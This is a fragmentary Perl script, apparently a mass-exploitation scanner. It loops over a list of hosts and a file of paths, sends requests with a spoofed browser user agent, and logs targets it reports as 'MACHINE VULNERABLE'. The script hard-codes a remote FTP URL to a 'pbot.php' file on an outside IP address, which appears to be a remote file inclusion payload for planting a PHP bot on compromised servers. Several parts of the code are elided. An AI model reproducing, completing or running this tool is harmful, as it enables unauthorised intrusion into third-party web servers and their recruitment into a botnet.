...
if ( !-e $word ) {
        die "\e[37;1m[\e[32;1m+\e[37;1m] \e[1;31;1mCRITICAL! Paths file does not seem to exist: $word\e[0m\n";
...
sub usage {
print ("\e[37;1m[\e[32;1m+\e[37;1m] \e[1;31;1mSyntax: $0 .. READ THE FUCKING MANUAL K1DD0ZZ=]\e[0m\n\n");
exit;
}
...
$curhost = $curhost + 1;
chomp($curhost);
print qq (\e[37;1m[\e[32;1m+\e[37;1m]\e[32;1mEXPLOIT\e[37;1m -> \e[31;1m$host \e[34;1m[\e[37;1m$curhost of \e[37;1m$total\e[34;1m]\e[0m\n);
open(my $wordh, "<" . $word);
while (<$wordh>) {
my $path = $_;
$path =~ s/\x0a//g;
...
my $ua = LWP::UserAgent->new(agent => "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]", env_proxy => 1, keep_alive => 1,timeout => 20);
my $url = $host;
my $ftp = "ftp://80.211.78.23/pbot.php";
my $len = length($ftp);
...
print OUT ("$host\n");
close OUT;
print("\e[37;1m[\e[32;1m+\e[37;1m]\e[32;1mMACHINE VULNERABLE\e[1;37;1m -> $host \e[0m\n");
}
$forkmanager->finish();
}
close($wordh);
